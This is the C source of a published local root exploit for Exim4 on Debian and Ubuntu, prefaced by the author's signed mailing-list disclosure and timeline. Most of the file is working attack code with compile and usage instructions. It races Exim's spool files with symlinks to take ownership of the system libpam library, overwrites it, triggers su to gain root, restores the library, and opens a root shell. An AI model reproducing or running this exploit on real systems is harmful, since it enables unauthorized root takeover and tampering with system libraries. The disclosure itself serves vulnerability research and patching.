/*
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Hello List,

This is just a minor issue in Exim, no replies so far, so publication
should be OK.

Introduction:
============
Exim4 in some variants is started as root but switches to uid/gid
Debian-exim/Debian-exim. But as Exim might need to store received
messages in user mailboxes, it has to have the ability to regain
privileges. This is also true when Exim is started as "sendmail".
During internal operation, sendmail (Exim) will manipulate message
spool files in directory structures owned by user "Debian-exim"
without caring about symlink attacks. Thus execution of code as
user "Debian-exim" can be used to gain root privileges by invoking
"sendmail" as user "Debian-exim".


POC:
===
http://www.halfdog.net/Security/2016/DebianEximSpoolLocalRoot/EximUpgrade.c
demonstrates the issue using a ELF file being both executable
and shared library which is invoked multiple times by different
processes.


Results, Discussion:
===================
As Exim4 process itself is already quite privileged - it has to
access the user mailboxes with different UIDs anyway - the having
such problems is expectable and explainable. A change in documentation
might make sense, to indicate, that the special user "Debian-exim"
is only intended to mark files being used by the daemon, but not
to provide root/daemon user privilege separation.

Even without this vulnerability, a "Debian-exim" process could
use http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
to escalate to "adm" group, which again makes it very likely to
use "syslog", "apache" or other components to escalate to root
via "/var/log". This is annoying, perhaps this should get a CVE
to make daemon-to-root escalations harder in general.


Timeline:
========
20160605: Discovery, report Debian security
20160607: Writeup
20160611: Also verified in Ubuntu, https://bugs.launchpad.net/ubuntu/+source/exim4/+bug/1580454/
20160630: Publication


References:
==========
* http://www.halfdog.net/Security/2016/DebianEximSpoolLocalRoot/
* http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
* https://bugs.launchpad.net/ubuntu/+source/exim4/+bug/1580454/
-----BEGIN PGP SIGNATURE-----

iEYEAREKAAYFAld0lPUACgkQxFmThv7tq+5MeACePVuh5CppGyhUudMfK7kjDXjj
8mcAn2AcZFVEwUKSHadffJJyCNLP0X7H
=4IJk
-----END PGP SIGNATURE-----

 * This software is provided by the copyright owner "as is" and any
 *  expressed or implied warranties, including, but not limited to,
 *  the implied warranties of merchantability and fitness for a particular
 *  purpose are disclaimed. In no event shall the copyright owner be
 *  liable for any direct, indirect, incidential, special, exemplary or
 *  consequential damages, including, but not limited to, procurement
 *  of substitute goods or services, loss of use, data or profits or
 *  business interruption, however caused and on any theory of liability,
 *  whether in contract, strict liability, or tort, including negligence
 *  or otherwise, arising in any way out of the use of this software,
 *  even if advised of the possibility of such damage.
 *
 *  Copyright (c) 2016 halfdog <me (%) halfdog.net>
 *  See http://www.halfdog.net/Security/2016/DebianEximSpoolLocalRoot/
 *  for more information.
 *
 *  Compile: gcc -fPIC -shared -Xlinker -init=_libInit -Xlinker '--soname=LIBPAM_1.0' -Xlinker --default-symver -o EximUpgrade EximUpgrade.c -Wl,-e_entry
 *  Use: Run as "Debian-exim": ./EximUpgrade --Upgrade
 */

#define _GNU_SOURCE
#include <assert.h>
#include <dirent.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

#define UPGRADE_FILE_NAME	"/var/spool/exim4/EximUpgrade"
#define UPGRADE_LIB_DIR		"/var/spool/exim4"

#define TARGET_PATH		"/lib/x86_64-linux-gnu/libpam.so.0.83.1"

extern char **environ;

#if defined(__x86_64__)
const char lib_interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";
#define init_args(argc, argv) __asm__ volatile ( \
    "mov 0x8(%%rbp), %%edx \n\tmov %%edx, %0 \n\tlea 0x10(%%rbp), %1 \n\t" \
    :"=m"(argc), "=r"(argv)::"memory")
#endif /* __x86_64__ */


/** Library initialization function, called by the linker. If not
 *  named _init, parameter has to be set during linking using -init=name
 */
extern void _libInit() {
  if(geteuid()!=0) return;
  int result=chown(UPGRADE_FILE_NAME, 0, 0);
  assert(!result);
  result=chmod(UPGRADE_FILE_NAME, 04755);
  assert(!result);
  exit(0);
}

extern void _entry (void) {
  int	argc=0;
  char	**argv = NULL;
  init_args(argc, argv);
  int result=main(argc, argv);
  exit(result);
}

extern void pam_start() {}
extern void pam_set_item() {}
extern void pam_chauthtok() {}
extern void pam_end() {}
extern void pam_strerror() {}
extern void pam_getenvlist() {}
extern void pam_open_session() {}
extern void pam_close_session() {}
extern void pam_get_item() {}
extern void pam_acct_mgmt() {}
extern void pam_setcred() {}
extern void pam_authenticate() {}


int main(int argc, char **argv) {
  DIR	*dirStruct;
  struct dirent	*dirEnt;
  char	linkPath[1024];
  int	result;

  assert(argc>1);
  if(!strcmp(argv[1], "--Exec")) {
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    execve(argv[2], argv+2, environ);
    fprintf(stderr, "Exec failed\n");
    return(1);
  }

  if(!strcmp(argv[1], "--Repair")) {
    int targetFd=open(TARGET_PATH, O_RDWR);
    assert(targetFd>=0);
    result=chown(TARGET_PATH, atoi(argv[2]), atoi(argv[3]));
    assert(!result);
    chmod(TARGET_PATH, atoi(argv[4]));
    return(0);
  }

  if(!strcmp(argv[1], "--Upgrade")) {
    struct stat origStatData;
    stat(TARGET_PATH, &origStatData);

    char *execArgs[6];
    int childPid=fork();
    if(!childPid) {
      int inputFd=open("/dev/null", O_RDONLY);
      dup2(inputFd, 0);
      execArgs[0]="/usr/sbin/sendmail";
      execArgs[1]="root@localhost";
      execArgs[2]=NULL;
      result=execve(execArgs[0], execArgs, environ);
      assert(!result);
      return(0);
    }

    strcpy(linkPath, "/var/spool/exim4/input/xxxxxx-xxxxxx-xx-J");
    dirStruct=opendir("/var/spool/exim4/msglog");
    assert(dirStruct);
    result=1;
    while(result) {
      while((dirEnt=readdir(dirStruct))) {
        if(*dirEnt->d_name=='.') continue;
// Be fast, perhaps aligned word copy needed. Pray to 23 in demo.
        strncpy(linkPath+23, dirEnt->d_name, 16);
        result=symlink(TARGET_PATH, linkPath);
        assert(!result);
        fprintf(stderr, "Relinked %s\n", linkPath);
        break;
      }
      rewinddir(dirStruct);
    }
    closedir(dirStruct);
    while(1) {
      struct stat currentStatData;
      stat(TARGET_PATH, &currentStatData);
      if(currentStatData.st_uid!=origStatData.st_uid) break;
      sleep(1);
    }
    waitpid(childPid, NULL, 0);

    fprintf(stderr, "Target ready for writing\n");
    int targetFd=open(TARGET_PATH, O_RDWR);
    assert(targetFd>=0);
    char *origData=(char*)malloc(origStatData.st_size);
    result=read(targetFd, origData, origStatData.st_size);
    assert(result==origStatData.st_size);

    struct stat newStatData;
    stat(UPGRADE_FILE_NAME, &newStatData);
    char *newData=(char*)malloc(newStatData.st_size);
    int selfFd=open(UPGRADE_FILE_NAME, O_RDONLY);
    result=read(selfFd, newData, newStatData.st_size);
    assert(result==newStatData.st_size);
    close(selfFd);

    ftruncate(targetFd, 0);
    lseek(targetFd, 0, SEEK_SET);
    result=write(targetFd, newData, newStatData.st_size);
    assert(result==newStatData.st_size);
    fsync(targetFd);

    childPid=fork();
    if(!childPid) {
      execArgs[0]="/bin/su";
      execArgs[1]=NULL;
      result=execve(execArgs[0], execArgs, environ);
      assert(!result);
      return(0);
    }
    waitpid(childPid, NULL, 0);

    ftruncate(targetFd, 0);
    lseek(targetFd, 0, SEEK_SET);
    result=write(targetFd, origData, origStatData.st_size);
    close(targetFd);

    childPid=fork();
    if(!childPid) {
      char numbers[128];
      char *ptr=numbers;
      execArgs[0]=UPGRADE_FILE_NAME;
      execArgs[1]="--Repair";
      result=sprintf(ptr, "%d", origStatData.st_uid);
      execArgs[2]=ptr; ptr+=result+1;
      result=sprintf(ptr, "%d", origStatData.st_gid);
      execArgs[3]=ptr; ptr+=result+1;
      result=sprintf(ptr, "%d", origStatData.st_mode);
      execArgs[4]=ptr;
      execArgs[5]=NULL;
      result=execve(execArgs[0], execArgs, environ);
      assert(!result);
      return(0);
    }
    waitpid(childPid, NULL, 0);

    execArgs[0]=UPGRADE_FILE_NAME;
    execArgs[1]="--Exec";
    execArgs[2]="/bin/bash";
    execArgs[3]="-c";
    execArgs[4]="id; exec $0";
    execArgs[5]=NULL;
    execve(execArgs[0], execArgs, environ);
    return(1);
  }
  fprintf(stderr, "Usage: %s --Upgrade or --Exec [args]\n", argv[0]);
  return(1);
}